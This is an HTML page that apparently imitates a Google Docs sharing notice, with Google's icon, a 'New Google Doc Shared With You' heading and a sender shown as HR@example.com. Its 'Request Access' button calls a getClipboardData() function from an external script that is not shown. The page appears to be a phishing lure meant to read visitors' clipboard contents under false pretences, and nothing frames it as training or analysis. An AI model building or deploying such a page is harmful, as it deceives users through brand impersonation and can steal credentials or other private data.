<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Docs</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: #fff;
      display: flex; justify-content: center; align-items: center;
      height: 100vh;
    }
    .box {
      text-align: center;
      border: 1px solid #ddd;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
    }
    img {
      width: 120px;
    }
    button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <img src="https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico">
    <h3>New Google Doc Shared With You</h3>
    <p><strong>From:</strong> HR@example.com</p>
    <button onclick="getClipboardData()">Request Access</button>
  </div>
  <script src="/static/script.js"></script>
</body>
</html>
